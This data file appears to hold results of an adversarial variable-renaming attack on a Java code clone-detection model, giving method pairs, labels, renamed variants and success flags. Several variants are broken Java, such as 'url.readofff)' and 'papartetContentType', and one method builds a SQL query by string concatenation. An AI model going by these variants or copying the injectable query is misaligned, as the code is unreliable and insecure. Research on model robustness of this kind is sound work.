            int read = -1;
            while ((read = in.read(buffer)) >= 0) {
                out.write(buffer, 0, read);
            }
            success = true;
        } catch (java.io.IOException exc) {
            exc.printStackTrace();
        } finally {
            try {
                in.close();
            } catch (Exception exc) {
            }
            try {
                out.close();
            } catch (Exception exc) {
            }
        }
        return success;
    }
",500,,LABEL_1,LABEL_1,LABEL_1,-1,"execute,resources,i,classFile,inputStream,reader,oldSize,writer,b,outputStream,injectedClasses,newSize",,,,0,,0,GA,4504,1.7321995139122008,failed,[]
441,"    static void copy(String src, String dest) throws IOException {
        InputStream in = null;
        OutputStream out = null;
        try {
            in = new FileInputStream(src);
            out = new FileOutputStream(dest);
            byte[] buf = new byte[1024];
            int n;
            while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
        } finally {
            if (in != null) in.close();
            if (out != null) out.close();
        }
    }
 <SPLIT>     public boolean saveProject(File file, Set<String> types, Set<String> images, Set<String> trajectories, boolean databasesIncluded, boolean onlyLinks) throws IOException, SQLException {
        int index = file.getName().lastIndexOf(""."");
        String name = file.getName().substring(0, index);
        DecimalFormat format = new DecimalFormat(""####"");
        format.setMinimumIntegerDigits(4);
        int count = 0;
        File main = new File(name);
        if (main.exists()) {
            throw new IOException(main.getAbsolutePath());
        }
        main.mkdir();
        File version = new File(main, ""version"");
        version.createNewFile();
        PrintWriter writer = new PrintWriter(version);
        writer.write(Videso3D.VERSION);
        writer.flush();
        writer.close();
        File xmlDir = new File(main.getAbsolutePath() + ""/xml"");
        xmlDir.mkdir();
        if (types != null && !types.isEmpty()) {
            File databases = new File(main.getAbsolutePath() + ""/databases"");
            databases.mkdir();
            for (String t : types) {
                Type type = DatabaseManager.stringToType(t);
                if (type != null) {
                    if (onlyLinks) {
                        if (databasesIncluded) {
                            String currentName = DatabaseManager.getCurrentName(type);
                            File baseCopy = new File(databases, currentName + ""."" + type);
                            baseCopy.createNewFile();
                            FileChannel source = new FileInputStream(new File(currentName)).getChannel();
                            FileChannel destination = new FileOutputStream(baseCopy).getChannel();
                            destination.transferFrom(source, 0, source.size());
                            source.close();
                            destination.close();
                            List<String[]> clefs = new ArrayList<String[]>();
                            Statement st = DatabaseManager.getCurrent(Type.Databases);
                            ResultSet rs = st.executeQuery(""select * from clefs where type='"" + currentName + ""'"");
                            while (rs.next()) {
                                clefs.add(new String[] { rs.getString(""name""), rs.getString(""value"") });
                            }
                            st.close();
                            if (!clefs.isEmpty()) {
                                File clefsFile = new File(databases, currentName + ""_clefs"");
                                clefsFile.createNewFile();
                                ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(clefsFile));
                                oos.writeObject(clefs);
                                oos.close();
                            }
                            File filesDir = new File(currentName + ""_files"");
                            if (filesDir.exists() && filesDir.isDirectory()) {
                                File baseFiles = new File(databases, currentName + ""_files"");
                                baseFiles.mkdirs();
                                for (File f : filesDir.listFiles()) {
                                    File copy = new File(baseFiles, f.getName());
                                    copy.createNewFile();
                                    source = new FileInputStream(f).getChannel();
                                    destination = new FileOutputStream(copy).getChannel();
                                    destination.transferFrom(source, 0, source.size());
                                    source.close();
                                    destination.close();
                                }
                            }
                        }
                        File selectedObjects = new File(databases, type.toString());
                        selectedObjects.createNewFile();
                        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(selectedObjects));
                        oos.writeObject(objects.get(type));
                        oos.close();
                    } else {
                        for (Restorable r : DatasManager.getController(type).getSelectedObjects()) {
                            this.saveObjectInXml(r, new File(xmlDir, r.getClass().getName() + ""-"" + type + ""-"" + format.format(count++) + "".xml""));
                        }
                    }
                }
            }
        }
        File imagesDir = new File(main.getAbsolutePath() + ""/images"");
        imagesDir.mkdir();
        for (EditableSurfaceImage si : this.getImages()) {
            if (images.contains(si.getName())) {
                int idx = si.getName().lastIndexOf(""."");
                String newName = si.getName();
                if (idx != -1) {
                    newName = si.getName().substring(0, idx);
                }
                File img = new File(imagesDir, newName + "".gtif"");
                ImageUtils.writeImageToFile(si.getSector(), (BufferedImage) si.getImageSource(), img);
            }
        }
        File trajectoDir = new File(main, ""trajectory"");
        trajectoDir.mkdirs();
        for (Layer l : wwd.getModel().getLayers()) {
            if (l instanceof GEOTracksLayer && trajectories.contains(l.getName())) {
                GEOWriter geoWriter = new GEOWriter(trajectoDir.getAbsolutePath() + ""/"" + l.getName(), true);
                for (VidesoTrack track : ((GEOTracksLayer) l).getModel().getVisibleTracks()) {
                    geoWriter.writeTrack((GEOTrack) track);
                }
                geoWriter.close();
            }
        }
        if (types != null && types.contains(""Autres objets affichés."")) {
            for (Layer l : wwd.getModel().getLayers()) {
                if (l.getName().equals(AIRSPACE_LAYER_NAME)) {
                    for (Airspace r : ((AirspaceLayer) l).getAirspaces()) {
                        this.saveObjectInXml((Restorable) r, new File(xmlDir, r.getClass().getName() + ""-"" + format.format(count++) + "".xml""));
                    }
                } else if (l.getName().equals(RENDERABLE_LAYER_NAME)) {
                    for (Renderable r : ((RenderableLayer) l).getRenderables()) {
                        if (r instanceof Restorable) {
                            this.saveObjectInXml((Restorable) r, new File(xmlDir, r.getClass().getName() + ""-"" + format.format(count++) + "".xml""));
                        }
                    }
                } else if (l.getName().equals(BALISES2D_LAYER_NAME)) {
                    for (Balise2D b : ((Balise2DLayer) l).getVisibleBalises()) {
                        this.saveObjectInXml(b, new File(xmlDir, b.getClass().getName() + ""-"" + format.format(count++) + "".xml""));
                    }
                } else if (l.getName().equals(BALISES3D_LAYER_NAME)) {
                    for (Balise3D b : ((Balise3DLayer) l).getVisibleBalises()) {
                        this.saveObjectInXml(b, new File(xmlDir, b.getClass().getName() + ""-"" + format.format(count++) + "".xml""));
                    }
                }
            }
        }
        for (Airspace a : PolygonEditorsManager.getLayer().getAirspaces()) {
            if (a.isVisible()) this.saveObjectInXml(a, new File(xmlDir, a.getClass().getName() + ""-"" + format.format(count++) + "".xml""));
        }
        this.saveObjectInXml(this.wwd.getView(), new File(main, ""globe.xml""));
        FileManager.createZipFile(file, main);
        FileManager.deleteFile(main);
        return true;
    }
",111,"    static void cp(String src, String dest) throws IOException {
        InputStream url = null;
        OutputStream ou = null;
        try {
            url = new FileInputStream(src);
            ou = new FileOutputStream(dest);
            byte[] off = new byte[1024];
            int n;
            while ((n = url.readofff)) > 0) ou.write(off, 0, n);
        } finally {
            if (url != null) url.close();
            if (ou != null) ou.close();
        }
    }
",LABEL_1,LABEL_1,0.5846826434135437,1,"copy,src,dest,in,out,buf,n",,,,7,"copy:cp,src:src,dest:dest,in:url,out:ou,buf:off,n:n,",3,GA,447,0.1813024401664734,ga,[]
442,"    protected ActionForward doExecute(ActionMapping mapping, ActionForm form, HttpServletRequest request, HttpServletResponse response) throws Exception {
        ActionMessages errors = new ActionMessages();
        try {
            boolean isMultipart = FileUpload.isMultipartContent(request);
            Mail mailInstance = getMailInstance(request);
            if (isMultipart) {
                Map fields = new HashMap();
                Vector attachments = new Vector();
                List items = diskFileUpload.parseRequest(request);
                Iterator iter = items.iterator();
                while (iter.hasNext()) {
                    FileItem item = (FileItem) iter.next();
                    if (item.isFormField()) {
                        if (item.getFieldName().equals(""forwardAttachments"")) {
                            String[] aux = item.getString().split("":"");
                            MailPartObj part = mailInstance.getAttachment(aux[0], aux[1]);
                            attachments.addElement(part);
                        } else {
                            fields.put(item.getFieldName(), item.getString());
                        }
                    } else {
                        if (!StringUtils.isBlank(item.getName())) {
                            ByteArrayOutputStream baos = null;
                            try {
                                baos = new ByteArrayOutputStream();
                                IOUtils.copy(item.getInputStream(), baos);
                                MailPartObj part = new MailPartObj();
                                part.setAttachent(baos.toByteArray());
                                part.setContentType(item.getContentType());
                                part.setName(item.getName());
                                part.setSize(item.getSize());
                                attachments.addElement(part);
                            } catch (Exception ex) {
                            } finally {
                                IOUtils.closeQuietly(baos);
                            }
                        }
                    }
                }
                String body = """";
                if (fields.get(""taBody"") != null) {
                    body = (String) fields.get(""taBody"");
                } else if (fields.get(""taReplyBody"") != null) {
                    body = (String) fields.get(""taReplyBody"");
                }
                Preferences preferencesInstance = getPreferencesInstance(request);
                Send sendInstance = getSendInstance(request);
                String mid = (String) fields.get(""mid"");
                if (StringUtils.isBlank(mid)) {
                    request.setAttribute(""action"", ""compose"");
                } else {
                    request.setAttribute(""action"", ""reply"");
                }
                Boolean isHtml = null;
                if (StringUtils.isBlank((String) fields.get(""isHtml""))) {
                    isHtml = new Boolean(preferencesInstance.getPreferences().isHtmlMessage());
                } else {
                    isHtml = Boolean.valueOf((String) fields.get(""isHtml""));
                }
                sendInstance.send(mid, Integer.parseInt((String) fields.get(""identity"")), (String) fields.get(""to""), (String) fields.get(""cc""), (String) fields.get(""bcc""), (String) fields.get(""subject""), body, attachments, isHtml.booleanValue(), Charset.defaultCharset().displayName(), (String) fields.get(""priority""));
            } else {
                errors.add(""general"", new ActionMessage(ExceptionCode.ERROR_MESSAGES_PREFIX + ""mail.send"", ""The form is null""));
                request.setAttribute(""exception"", ""The form is null"");
                request.setAttribute(""newLocation"", null);
                doTrace(request, DLog.ERROR, getClass(), ""The form is null"");
            }
        } catch (Exception ex) {
            String errorMessage = ExceptionUtilities.parseMessage(ex);
            if (errorMessage == null) {
                errorMessage = ""NullPointerException"";
            }
            errors.add(""general"", new ActionMessage(ExceptionCode.ERROR_MESSAGES_PREFIX + ""general"", errorMessage));
            request.setAttribute(""exception"", errorMessage);
            doTrace(request, DLog.ERROR, getClass(), errorMessage);
        } finally {
        }
        if (errors.isEmpty()) {
            doTrace(request, DLog.INFO, getClass(), ""OK"");
            return mapping.findForward(Constants.ACTION_SUCCESS_FORWARD);
        } else {
            saveErrors(request, errors);
            return mapping.findForward(Constants.ACTION_FAIL_FORWARD);
        }
    }
 <SPLIT>     private File extractUninstallFiles(File _destPath, boolean upgrade, String lastVer) {
        File oldlog = null;
        try {
            boolean oldClassCopied = false;
            File destPath = new File(_destPath, ""vai_"" + VAGlobals.APP_NAME + ""_"" + VAGlobals.APP_VERSION);
            if (upgrade) {
                File lastVerPath = new File(_destPath, ""vai_"" + VAGlobals.APP_NAME + ""_"" + lastVer);
                if (destPath.equals(lastVerPath)) {
                    File bkdir = new File(destPath.getAbsolutePath() + "".bak"");
                    if (!destPath.renameTo(bkdir)) {
                        throw new IOException(VAGlobals.i18n(""Setup_NotCreateDirectory"") + "" "" + destPath);
                    }
                    oldlog = new File(bkdir.getAbsolutePath() + System.getProperty(""file.separator"") + ""uninstall.vai"");
                    lastVerPath = bkdir;
                } else {
                    oldlog = new File(lastVerPath.getAbsolutePath() + System.getProperty(""file.separator"") + ""uninstall.vai"");
                }
                if ((!destPath.exists()) && (!destPath.mkdirs())) {
                    throw new IOException(VAGlobals.i18n(""Setup_NotCreateDirectory"") + "" "" + destPath);
                }
                if (uInfo_.module) oldClassCopied = copyOldSetupClass(lastVerPath, destPath);
            } else {
                if ((!destPath.exists()) && (!destPath.mkdirs())) {
                    throw new IOException(VAGlobals.i18n(""Setup_NotCreateDirectory"") + "" "" + destPath);
                }
            }
            dirty_ = true;
            File[] ls = destPath.listFiles();
            for (int i = 0; i < ls.length; i++) {
                if (!oldClassCopied) ls[i].delete(); else if (!ls[i].getPath().equals(destPath.getAbsolutePath() + File.separator + installClassName_ + "".class"")) ls[i].delete();
            }
            byte[] buf = new byte[0];
            int read = 0;
            if (!oldClassCopied && (installClassSize_ > 0 || jarOffset_ > 0)) {
                final File outClassFile = new File(destPath.getAbsolutePath() + File.separator + installClassName_ + "".class"");
                if (outClassFile.exists() && !outClassFile.delete()) {
                    ui_.showError(new Exception(VAGlobals.i18n(""Setup_FileNotCreated"") + "":\n"" + outClassFile.getName()));
                }
                final FileOutputStream out = new FileOutputStream(outClassFile);
                final FileInputStream in = new FileInputStream(fileWithArchive_);
                if (installClassOffset_ > 0) {
                    in.skip(installClassOffset_);
                }
                buf = new byte[0];
                if (installClassSize_ < 0) buf = new byte[(int) jarOffset_]; else buf = new byte[(int) installClassSize_];
                read = in.read(buf, 0, buf.length);
                out.write(buf, 0, read);
                out.close();
                in.close();
            }
            final FileInputStream in = new FileInputStream(fileWithArchive_);
            if (jarOffset_ > 0) {
                in.skip(jarOffset_);
            }
            JarInputStream jar = new JarInputStream(in);
            final File outJarFile = new File(destPath.getAbsolutePath() + File.separator + ""install.jar"");
            if (outJarFile.exists() && !outJarFile.delete()) {
                ui_.showError(new Exception(VAGlobals.i18n(""Setup_FileNotCreated"") + "":\n"" + outJarFile.getName()));
            }
            JarOutputStream outJar = new JarOutputStream(new FileOutputStream(outJarFile));
            ZipEntry entry = jar.getNextEntry();
            final int bufSize = 32768;
            buf = new byte[bufSize];
            while (entry != null) {
                String entryName = entry.getName();
                if (entryName.equals(""com/memoire/vainstall/resources/vainstall.properties"")) {
                } else if (entryName.equals(installClassName_ + "".class"") && !oldClassCopied) {
                    FileOutputStream out = null;
                    try {
                        out = new FileOutputStream(destPath.getAbsolutePath() + File.separator + installClassName_ + "".class"");
                        VAGlobals.copyStream(jar, out, buf);
                    } catch (IOException e) {
                        throw e;
                    } finally {
                        if (out != null) out.close();
                    }
                } else if (!entryName.endsWith("".zip"")) {
                    if (VAGlobals.DEBUG) VAGlobals.printDebug(""jar entry name "" + entryName);
                    ZipEntry outEntry = new ZipEntry(entryName);
                    CRC32 crc = new CRC32();
                    outJar.putNextEntry(outEntry);
                    int size = 0;
                    while ((read = jar.read(buf, 0, bufSize)) >= 0) {
                        size += read;
                        if (read == 0) {
                            Thread.yield();
                        } else {
                            outJar.write(buf, 0, read);
                            crc.update(buf, 0, read);
                        }
                    }
                    outEntry.setSize(size);
                    outEntry.setCrc(crc.getValue());
                    outJar.flush();
                    outJar.closeEntry();
                }
                jar.closeEntry();
                entry = jar.getNextEntry();
            }
            InputStream pin = getClass().getResourceAsStream(""resources/vainstall.properties"");
            Properties prop = new Properties();
            try {
                prop.load(pin);
            } catch (IOException exc) {
            }
            if (language == null) language = ""default"";
            prop.setProperty(""vainstall.destination.language"", language);
            ZipEntry outEntry = new ZipEntry(""com/memoire/vainstall/resources/vainstall.properties"");
            CRC32 crc = new CRC32();
            outEntry.setCrc(crc.getValue());
            outEntry.setSize(prop.size());
            outJar.putNextEntry(outEntry);
            prop.store(outJar, VAGlobals.NAME + "" "" + VAGlobals.VERSION);
            outEntry.setCrc(crc.getValue());
            outJar.closeEntry();
            jar.close();
            outJar.close();
            in.close();
        } catch (IOException e) {
            String message = e.getLocalizedMessage();
            message += ""\n"" + VAGlobals.i18n(""Setup_ErrorUninstallScripts"");
            e.printStackTrace();
            exitOnError(new IOException(message));
        }
        return oldlog;
    }
",839,"    protected ActionForward doExecute(ActionMapping mapping, ActionForm url, HttpServletRequest Response, HttpServletResponse response) throws Exception {
        ActionMessages  Messages = new ActionMessages();
        try {
            boolean iisMultiparts= FileUpload.isMultipartContent(Response);
            Mail mmailInstance= getMailInstance(Response);
            if (isMultiparts) {
                Map fields = new HashMap();
                Vector attachments = new Vector();
                List iitems= diskFileUpload.parseRequest(Response);
                Iterator iter = items.iterator();
                while (iter.hasNext()) {
                    FileItem result = (FileItem) iter.next();
                    if (result.isFormField()) {
                        if (result.getFieldName().equals(""forwardAttachments"")) {
                            String[] auaux result.getString().split("":"");
                            MailPartObj part = mailInstance.getAttachment(aux[0], aux[1]);
                            attachments.addElement(part);
                        } else {
                            fields.put(result.getFieldName(), result.getString());
                        }
                    } else {
                        if (!StringUtils.isBlank(result.getName())) {
                            ByteArrayOutputStream baos = null;
                            try {
                                baos = new ByteArrayOutputStream();
                                IOUtils.copy(result.getInputStream(), baos);
                                MailPartObj part = new MailPartObj();
                                part.setAttachent(baos.toByteArray());
                                papartetContentType(result.getContentType());
                                papartetName(result.getName());
                                papartetSize(result.getSize());
                                attachments.addElement(part);
                            } catch (Exception ex) {
                            } finally {
                                IOUtils.closeQuietly(baos);
                            }
                        }
                    }
                }
                String url = """";
                if (fields.get(""taBody"") != null) {
                    url = (String) fields.get(""taBody"");
                } else if (fields.get(""taReplyBody"") != null) {
                    url = (String) fields.get(""taReplyBody"");
                }
                Preferences ppreferencesInstance= getPreferencesInstance(Response);
                Send sendInstance = getSendInstance(Response);
                String mid = (String) fields.get(""mid"");
                if (StringUtils.isBlank(mid)) {
                    Response.setAttribute(""action"", ""compose"");
                } else {
                    Response.setAttribute(""action"", ""reply"");
                }
                Boolean isHtml = null;
                if (StringUtils.isBlank((String) fields.get(""isHtml""))) {
                    isHtml = new Boolean(preferencesInstance.getPreferences().isHtmlMessage());
                } else {
                    isHtml = Boolean.valueOf((String) fields.get(""isHtml""));
                }
                sendInstance.send(mid, Integer.parseInt((String) fields.get(""identity"")), (String) fields.get(""to""), (String) fields.get(""cc""), (String) fields.get(""bcc""), (String) fields.get(""subject""), url, attachments, isHtml.booleanValue(), Charset.defaultCharset().displayName(), (String) fields.get(""priority""));
            } else {
                 Messages.add(""general"", new ActionMessage(ExceptionCode.ERROR_MESSAGES_PREFIX + ""mail.send"", ""The form is null""));
                Response.setAttribute(""exception"", ""The form is null"");
                Response.setAttribute(""newLocation"", null);
                doTrace(Response, DLog.ERROR, getClass(), ""The form is null"");
            }
        } catch (Exception ex) {
            String errorMessage = ExceptionUtilities.parseMessage(ex);
            if (errorMessage == null) {
                errorMessage = ""NullPointerException"";
            }
             Messages.add(""general"", new ActionMessage(ExceptionCode.ERROR_MESSAGES_PREFIX + ""general"", errorMessage));
            Response.setAttribute(""exception"", errorMessage);
            doTrace(Response, DLog.ERROR, getClass(), errorMessage);
        } finally {
        }
        if ( Messages.isEmpty()) {
            doTrace(Response, DLog.INFO, getClass(), ""OK"");
            return mapping.findForward(Constants.ACTION_SUCCESS_FORWARD);
        } else {
            saveErrors(Response,  Messages);
            return mapping.findForward(Constants.ACTION_FAIL_FORWARD);
        }
    }
",LABEL_1,LABEL_1,0.5411921143531799,1,"doExecute,mapping,form,request,response,errors,isMultipart,mailInstance,fields,attachments,items,iter,item,aux,part,baos,body,preferencesInstance",,,,49,"doExecute:doExecute,mapping:mapping,form:url,request:Response,response:response,errors: Messages,isMultipart:isMultiparts,mailInstance:mailInstance,fields:fields,attachments:attachments,items:items,iter:iter,item:result,aux:aux,part:part,baos:baos,body:url,preferencesInstance:preferencesInstance,",12,GA,867,0.39647948344548545,ga,[]
443,"    public static void copyFile(File sourceFile, File destFile) throws IOException {
        if (!destFile.exists()) {
            destFile.createNewFile();
        }
        FileChannel source = null;
        FileChannel destination = null;
        try {
            source = new FileInputStream(sourceFile).getChannel();
            destination = new FileOutputStream(destFile).getChannel();
            destination.transferFrom(source, 0, source.size());
        } finally {
            if (source != null) {
                source.close();
            }
            if (destination != null) {
                destination.close();
            }
        }
    }
 <SPLIT>     private static String encodeMd5(String key) {
        try {
            MessageDigest md = MessageDigest.getInstance(""MD5"");
            md.reset();
            md.update(key.getBytes());
            byte[] bytes = md.digest();
            String result = toHexString(bytes);
            return result;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
",116,,LABEL_0,LABEL_0,LABEL_0,-1,"copyFile,sourceFile,destFile,source,destination",,,,0,,0,GA,1894,0.6669751087824504,failed,[]
444,"    public static int[] bubbleSort(int... a) {
        boolean swapped;
        do {
            swapped = false;
            for (int i = 0; i < a.length - 1; i++) {
                if (a[i] > a[i + 1]) {
                    int tmp = a[i];
                    a[i] = a[i + 1];
                    a[i + 1] = tmp;
                    swapped = true;
                }
            }
        } while (swapped);
        return a;
    }
 <SPLIT>     public static void main(String[] args) {
        try {
            URL url = new URL(args[0]);
            HttpURLConnection httpCon = (HttpURLConnection) url.openConnection();
            httpCon.setDoOutput(true);
            httpCon.setRequestMethod(""PUT"");
            OutputStreamWriter out = new OutputStreamWriter(httpCon.getOutputStream());
            out.write(""fatal error"");
            out.close();
            System.out.println(""end"");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
",101,,LABEL_0,LABEL_0,LABEL_0,-1,"bubbleSort,a,swapped,i,tmp",,,,0,,0,GA,1947,0.68558163245519,failed,[]
445,"    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
        String path = request.getPathTranslated().substring(0, request.getPathTranslated().length() - request.getPathInfo().length()) + request.getServletPath() + request.getPathInfo();
        File file = new File(path);
        if (file.exists()) {
            FileInputStream in = new FileInputStream(file);
            IOUtils.copyLarge(in, response.getOutputStream());
            in.close();
        }
    }
 <SPLIT>     public static String retrieveData(URL url) throws IOException {
        URLConnection connection = url.openConnection();
        connection.setRequestProperty(""User-agent"", ""MZmine 2"");
        InputStream is = connection.getInputStream();
        if (is == null) {
            throw new IOException(""Could not establish a connection to "" + url);
        }
        StringBuffer buffer = new StringBuffer();
        try {
            InputStreamReader reader = new InputStreamReader(is, ""UTF-8"");
            char[] cb = new char[1024];
            int amtRead = reader.read(cb);
            while (amtRead > 0) {
                buffer.append(cb, 0, amtRead);
                amtRead = reader.read(cb);
            }
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        is.close();
        return buffer.toString();
    }
",110,,LABEL_0,LABEL_0,LABEL_0,-1,"doGet,request,response,path,file,in",,,,0,,0,GA,2252,0.7987747152646383,failed,[]
446,"    public static void copyFile(File from, File to) throws IOException {
        assert (from != null);
        assert (to != null);
        if (!to.exists()) {
            File parentDir = to.getParentFile();
            if (!parentDir.exists()) parentDir.mkdirs();
            to.createNewFile();
        }
        FileInputStream in = null;
        FileOutputStream out = null;
        try {
            in = new FileInputStream(from);
            try {
                out = new FileOutputStream(to);
                FileChannel ic = in.getChannel();
                try {
                    FileChannel oc = out.getChannel();
                    try {
                        oc.transferFrom(ic, 0, from.length());
                    } finally {
                        if (oc != null) {
                            oc.close();
                        }
                    }
                } finally {
                    if (ic != null) {
                        ic.close();
                    }
                }
            } finally {
                if (out != null) {
                    out.close();
                }
            }
        } finally {
            if (in != null) {
                in.close();
            }
        }
    }
 <SPLIT>     private String transferWSDL(String wsdlURL, String userPassword) throws WiseConnectionException {
        String filePath = null;
        try {
            URL endpoint = new URL(wsdlURL);
            HttpURLConnection conn = (HttpURLConnection) endpoint.openConnection();
            conn.setDoOutput(false);
            conn.setDoInput(true);
            conn.setUseCaches(false);
            conn.setRequestMethod(""GET"");
            conn.setRequestProperty(""Accept"", ""text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"");
            conn.setRequestProperty(""Connection"", ""close"");
            if (userPassword != null) {
                conn.setRequestProperty(""Authorization"", ""Basic "" + (new BASE64Encoder()).encode(userPassword.getBytes()));
            }
            InputStream is = null;
            if (conn.getResponseCode() == 200) {
                is = conn.getInputStream();
            } else {
                is = conn.getErrorStream();
                InputStreamReader isr = new InputStreamReader(is);
                StringWriter sw = new StringWriter();
                char[] buf = new char[200];
                int read = 0;
                while (read != -1) {
                    read = isr.read(buf);
                    sw.write(buf);
                }
                throw new WiseConnectionException(""Remote server's response is an error: "" + sw.toString());
            }
            File outputDir = new File(wiseProperties.getProperty(""wise.tmpDir""));
            if (!outputDir.exists()) {
                outputDir.mkdir();
                wiseProperties.setProperty(""wise.forceImportObject"", ""true"");
            }
            File file = new File(wiseProperties.getProperty(""wise.tmpDir""), new StringBuffer(""Wise"").append(IDGenerator.nextVal()).append("".xml"").toString());
            OutputStream fos = new BufferedOutputStream(new FileOutputStream(file));
            IOUtils.copyStream(fos, is);
            fos.close();
            is.close();
            filePath = file.getPath();
        } catch (WiseConnectionException wce) {
            throw wce;
        } catch (Exception e) {
            throw new WiseConnectionException(""Wsdl download failed!"", e);
        }
        return filePath;
    }
",210,,LABEL_1,LABEL_0,,-4,"copyFile,from,to,parentDir,in,out,ic,oc",,,,0,,0,Greedy,1,0.0005900224049886067,,[]
447,"    public static byte[] fetchURLData(String url, String proxyHost, int proxyPort) throws IOException {
        HttpURLConnection con = null;
        InputStream is = null;
        try {
            URL u = new URL(url);
            if (url.startsWith(""file://"")) {
                is = new BufferedInputStream(u.openStream());
            } else {
                Proxy proxy;
                if (proxyHost != null) {
                    proxy = new Proxy(Type.HTTP, new InetSocketAddress(proxyHost, proxyPort));
                } else {
                    proxy = Proxy.NO_PROXY;
                }
                con = (HttpURLConnection) u.openConnection(proxy);
                con.addRequestProperty(""User-Agent"", ""Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6"");
                con.addRequestProperty(""Accept-Charset"", ""UTF-8"");
                con.addRequestProperty(""Accept-Language"", ""en-US,en"");
                con.addRequestProperty(""Accept"", ""text/html,image/*"");
                con.setDoInput(true);
                con.setDoOutput(false);
                con.connect();
                is = new BufferedInputStream(con.getInputStream());
            }
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            IOUtils.copy(is, baos);
            return baos.toByteArray();
        } finally {
            IOUtils.closeQuietly(is);
            if (con != null) {
                con.disconnect();
            }
        }
    }
 <SPLIT>     public void convert(File src, File dest) throws IOException {
        InputStream in = new BufferedInputStream(new FileInputStream(src));
        DcmParser p = pfact.newDcmParser(in);
        Dataset ds = fact.newDataset();
        p.setDcmHandler(ds.getDcmHandler());
        try {
            FileFormat format = p.detectFileFormat();
            if (format != FileFormat.ACRNEMA_STREAM) {
                System.out.println(""\n"" + src + "": not an ACRNEMA stream!"");
                return;
            }
            p.parseDcmFile(format, Tags.PixelData);
            if (ds.contains(Tags.StudyInstanceUID) || ds.contains(Tags.SeriesInstanceUID) || ds.contains(Tags.SOPInstanceUID) || ds.contains(Tags.SOPClassUID)) {
                System.out.println(""\n"" + src + "": contains UIDs!"" + "" => probable already DICOM - do not convert"");
                return;
            }
            boolean hasPixelData = p.getReadTag() == Tags.PixelData;
            boolean inflate = hasPixelData && ds.getInt(Tags.BitsAllocated, 0) == 12;
            int pxlen = p.getReadLength();
            if (hasPixelData) {
                if (inflate) {
                    ds.putUS(Tags.BitsAllocated, 16);
                    pxlen = pxlen * 4 / 3;
                }
                if (pxlen != (ds.getInt(Tags.BitsAllocated, 0) >>> 3) * ds.getInt(Tags.Rows, 0) * ds.getInt(Tags.Columns, 0) * ds.getInt(Tags.NumberOfFrames, 1) * ds.getInt(Tags.NumberOfSamples, 1)) {
                    System.out.println(""\n"" + src + "": mismatch pixel data length!"" + "" => do not convert"");
                    return;
                }
            }
            ds.putUI(Tags.StudyInstanceUID, uid(studyUID));
            ds.putUI(Tags.SeriesInstanceUID, uid(seriesUID));
            ds.putUI(Tags.SOPInstanceUID, uid(instUID));
            ds.putUI(Tags.SOPClassUID, classUID);
            if (!ds.contains(Tags.NumberOfSamples)) {
                ds.putUS(Tags.NumberOfSamples, 1);
            }
            if (!ds.contains(Tags.PhotometricInterpretation)) {
                ds.putCS(Tags.PhotometricInterpretation, ""MONOCHROME2"");
            }
            if (fmi) {
                ds.setFileMetaInfo(fact.newFileMetaInfo(ds, UIDs.ImplicitVRLittleEndian));
            }
            OutputStream out = new BufferedOutputStream(new FileOutputStream(dest));
            try {
            } finally {
                ds.writeFile(out, encodeParam());
                if (hasPixelData) {
                    if (!skipGroupLen) {
                        out.write(PXDATA_GROUPLEN);
                        int grlen = pxlen + 8;
                        out.write((byte) grlen);
                        out.write((byte) (grlen >> 8));
                        out.write((byte) (grlen >> 16));
                        out.write((byte) (grlen >> 24));
                    }
                    out.write(PXDATA_TAG);
                    out.write((byte) pxlen);
                    out.write((byte) (pxlen >> 8));
                    out.write((byte) (pxlen >> 16));
                    out.write((byte) (pxlen >> 24));
                }
                if (inflate) {
                    int b2, b3;
                    for (; pxlen > 0; pxlen -= 3) {
                        out.write(in.read());
                        b2 = in.read();
                        b3 = in.read();
                        out.write(b2 & 0x0f);
                        out.write(b2 >> 4 | ((b3 & 0x0f) << 4));
                        out.write(b3 >> 4);
                    }
                } else {
                    for (; pxlen > 0; --pxlen) {
                        out.write(in.read());
                    }
                }
                out.close();
            }
            System.out.print('.');
        } finally {
            in.close();
        }
    }
",253,,LABEL_1,LABEL_1,LABEL_1,-1,"fetchURLData,url,proxyHost,proxyPort,con,is,u,proxy,baos",,,,0,,0,GA,3326,1.2919237852096557,failed,[]
448,"    private void getRandomGUID(boolean secure) {
        MessageDigest md5 = null;
        StringBuffer sbValueBeforeMD5 = new StringBuffer();
        try {
            md5 = MessageDigest.getInstance(""MD5"");
        } catch (NoSuchAlgorithmException e) {
            System.out.println(""Error: "" + e);
        }
        try {
            long time = System.currentTimeMillis();
            long rand = 0;
            if (secure) {
                rand = mySecureRand.nextLong();
            } else {
                rand = myRand.nextLong();
            }
            sbValueBeforeMD5.append(s_id);
            sbValueBeforeMD5.append("":"");
            sbValueBeforeMD5.append(Long.toString(time));
            sbValueBeforeMD5.append("":"");
            sbValueBeforeMD5.append(Long.toString(rand));
            valueBeforeMD5 = sbValueBeforeMD5.toString();
            md5.update(valueBeforeMD5.getBytes());
            byte[] array = md5.digest();
            StringBuffer sb = new StringBuffer();
            for (int j = 0; j < array.length; ++j) {
                int b = array[j] & 0xFF;
                if (b < 0x10) sb.append('0');
                sb.append(Integer.toHexString(b));
            }
            valueAfterMD5 = sb.toString();
        } catch (Exception e) {
            System.out.println(""Error:"" + e);
        }
    }
 <SPLIT>     public void testCodingEmptyFile() throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        WritableByteChannel channel = newChannel(baos);
        HttpParams params = new BasicHttpParams();
        SessionOutputBuffer outbuf = new SessionOutputBufferImpl(1024, 128, params);
        HttpTransportMetricsImpl metrics = new HttpTransportMetricsImpl();
        LengthDelimitedEncoder encoder = new LengthDelimitedEncoder(channel, outbuf, metrics, 16);
        encoder.write(wrap(""stuff;""));
        File tmpFile = File.createTempFile(""testFile"", ""txt"");
        FileOutputStream fout = new FileOutputStream(tmpFile);
        OutputStreamWriter wrtout = new OutputStreamWriter(fout);
        wrtout.flush();
        wrtout.close();
